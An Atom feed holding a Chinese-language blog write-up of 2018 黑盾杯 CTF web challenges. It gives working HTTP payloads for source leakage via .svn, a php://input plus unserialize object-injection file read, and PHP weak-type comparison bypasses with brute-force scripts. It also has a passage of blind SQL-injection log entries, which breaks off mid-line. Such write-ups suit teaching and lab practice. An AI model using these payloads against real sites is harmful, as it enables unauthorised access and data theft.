<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Somnus&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Foxgrin.github.io/"/>
  <updated>2018-09-17T12:25:28.187Z</updated>
  <id>https://Foxgrin.github.io/</id>
  
  <author>
    <name>Somnus</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2018黑盾杯Web</title>
    <link href="https://Foxgrin.github.io//posts/15234/"/>
    <id>https://Foxgrin.github.io//posts/15234/</id>
    <published>2018-09-16T06:34:00.000Z</published>
    <updated>2018-09-17T12:25:28.187Z</updated>
    
    <content type="html"><![CDATA[<p>2018黑盾杯Web题解<a id="more"></a></p><h3 id="无论你输入什么都是错的"><a href="#无论你输入什么都是错的" class="headerlink" title="无论你输入什么都是错的"></a>无论你输入什么都是错的</h3><p>bp抓包获得源代码发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;form1&quot; name=&quot;form1&quot; method=&quot;get&quot; action=&quot;da.html&quot;&gt;</span><br></pre></td></tr></table></figure><p>访问da.html</p><p>源代码中发现flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- flag&#123;250872eab74e4ae2d11ff2b5b3fcb1a5&#125;!--&gt;</span><br></pre></td></tr></table></figure><h3 id="听说很漂亮"><a href="#听说很漂亮" class="headerlink" title="听说很漂亮"></a>听说很漂亮</h3><p>bp抓包发现js代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">document</span>.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> a,b,c,d,e,f,g;</span><br><span class="line">    a = <span class="number">6.10</span>;</span><br><span class="line">    b = a * <span class="number">2</span>;</span><br><span class="line">    c = a + b;</span><br><span class="line">    d = c / b + a;</span><br><span class="line">    e = c - d * b + a;</span><br><span class="line">    f = e + d /c -b * a;</span><br><span class="line">    g = f * e - d + c * b + a;</span><br><span class="line">    a = g * g;</span><br><span class="line">    a = <span class="built_in">Math</span>.floor(a);</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">"txt"</span>).value==a)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            alert(<span class="string">"密码错误"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>需要GET参数txt值等于a的值</p><p>在本地运行测试a的值为98910652</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /web/beautiful/ HTTP/1.1</span><br><span class="line">Host: 192.168.200.200</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://192.168.3.1/student/exam-second/seize-flag</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=i8h2rmbg3p18n5mt0ppar8a4d5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line">txt=98910652</span><br></pre></td></tr></table></figure><p>获得flag:flag{4b5aabaa648c42c53d39935e7ff663b9}</p><h3 id="信息泄露加代码审计"><a href="#信息泄露加代码审计" class="headerlink" title="信息泄露加代码审计"></a>信息泄露加代码审计</h3><p>访问/.svn存在泄露文件获得源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$user = $_COOKIE[<span class="string">'user'</span>];</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>]?(int)$_GET[<span class="string">'code'</span>]:<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($user == <span class="string">'admin'</span> &amp;&amp; !<span class="keyword">empty</span>($code)) &#123;</span><br><span class="line"></span><br><span class="line">$hex = (int)$code;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(($hex ^ <span class="number">6789</span>) === <span class="number">0xCDEF</span>) &#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"缺少应有的参数,你没有权限查看本内容"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>获得flag条件是$user=admin，$code ^ 6789 = 0xCDEF</p><p>写个脚本爆破code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</span><br><span class="line">    <span class="keyword">if</span> i ^ <span class="number">6789</span> == <span class="number">0xCDEF</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>运行结果：55146</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /web/codeaudit/?code=55146 HTTP/1.1</span><br><span class="line">Host: 192.168.200.200</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://192.168.3.1/student/exam-second/seize-flag</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=i8h2rmbg3p18n5mt0ppar8a4d5;user=admin</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>flag:﻿﻿flag{a737c5c5b759c3705c8100accf65b5e4}</p><h3 id="the-user-is-admin"><a href="#the-user-is-admin" class="headerlink" title="the user is admin"></a>the user is admin</h3><p>bugku原题，先通过PHP伪协议读取源代码，然后发现要利⽤反序列化漏洞读取flag⽂件。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># index.php</span><br><span class="line">&lt;?php</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">POST这个数据包就能看到flag</span><br><span class="line">joomla</span><br><span class="line">echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">if(preg_match(&quot;/f1a9/&quot;,$file))&#123;</span><br><span class="line">exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">include($file); //class.php</span><br><span class="line">$pass = unserialize($pass);</span><br><span class="line">echo $pass;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地测试获得序列化字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = <span class="keyword">new</span> Read();</span><br><span class="line">$p-&gt;file = <span class="string">'f1a9.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($p);</span><br><span class="line"><span class="comment">#$p == "O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST该数据包就能获得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /web/theuserisadmin/index.php?file=class.php&amp;pass=O:4:&quot;Read&quot;:1:</span><br><span class="line">&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125;&amp;user=php://input HTTP/1.1</span><br><span class="line">Host: 192.168.200.200</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure><p>flag{078d8dd8023d5716a11780adf344dfd2}</p><h3 id="最好的语言"><a href="#最好的语言" class="headerlink" title="最好的语言"></a>最好的语言</h3><p>源码审计题⽬，考察PHP弱类型⽐较： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$a=<span class="number">0</span>;</span><br><span class="line">$b=<span class="number">0</span>;</span><br><span class="line">$c=<span class="number">0</span>;</span><br><span class="line">$d=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$x1 = $_GET[<span class="string">'x1'</span>];</span><br><span class="line">$x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">switch</span> ($x1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array($x2))&#123;</span><br><span class="line">is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123;</span><br><span class="line">($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>);</span><br><span class="line">$p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]);</span><br><span class="line">$p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">$val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$x3 = $_GET[<span class="string">'x3'</span>];</span><br><span class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">$d=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先来看第一个条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&apos;x1&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$x1 = $_GET[&apos;x1&apos;];</span><br><span class="line">$x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL;</span><br><span class="line">switch ($x1)</span><br><span class="line">&#123;</span><br><span class="line">case 0:</span><br><span class="line">case 1:</span><br><span class="line">$a=1;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察弱类型比较，switch函数处理字符串时也会对字符串进行intval处理</p><p>payload:x1=1a</p><p>第二个条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array($x2))&#123;</span><br><span class="line">is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123;</span><br><span class="line">($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>);</span><br><span class="line">$p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]);</span><br><span class="line">$p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">$val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>json_decode会对json格式的字符串进行解码，解码后通过(array)转化为数组</p><p>数组中必须含有键名x21和x22，其中键名x21对应的键值不能是数字字符串且必须大于2017，根据PHP弱类型比较可以赋值”x21”=&gt;”2017a”</p><p>键名x22对应键值必须是一个数组，且数组元素个数要等于2且数组第一个元素也必须是一个数组，然后键值数组的每一个元素都不能等于”XIPU”，但是array_search函数搜索键值数组中是否含有”XIPU”必须返回true，这里需要利用到array_search函数的特点，也是弱类型比较，”XIPU”intval值为0，数组中任一元素为0即可返回true</p><p>所以payload:x2={“x21”:”2017a”,”x22”:[[1],0]}</p><p>第三个条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$x3 = $_GET[&apos;x3&apos;];</span><br><span class="line">if ($x3 != &apos;15562&apos;) &#123;</span><br><span class="line">if (strstr($x3, &apos;XIPU&apos;)) &#123;</span><br><span class="line">if (substr(md5($x3),8,16) == substr(md5(&apos;15562&apos;),8,16)) &#123;</span><br><span class="line">$d=1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$x3弱类型比较不等于’15562’，且’XIPU’必须出现在$x3中，且$x3经过md5函数加密后的第八位到第十六位等于’15562’经过md5函数加密后的第八位到第十六位</p><p>这里想不出怎么绕过，我就直接写了个脚本破解，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/test/test34.php?x3="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000000</span>):</span><br><span class="line">    url = url + str(i) + <span class="string">'XIPU'</span></span><br><span class="line">    print(url)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    print(r.text + <span class="string">' i: '</span> + str(i))</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/test/test34.php?x3="</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'yes'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>本地环境代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$x3 = $_GET[<span class="string">'x3'</span>];</span><br><span class="line"><span class="keyword">echo</span> substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span>(substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'yes'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>爆破结果为x3=47484XIPU</p><p>最终的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x1=1a&amp;x2=&#123;&quot;x21&quot;:&quot;2017a&quot;,&quot;x22&quot;:[[1],0]&#125;&amp;x3=47484XIPU</span><br></pre></td></tr></table></figure><h3 id="注入日志分析"><a href="#注入日志分析" class="headerlink" title="注入日志分析"></a>注入日志分析</h3><p>存在data.log文件</p><p>首先对文件进行url解码后搜索关键字flag，过滤出最后的盲注flag语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND 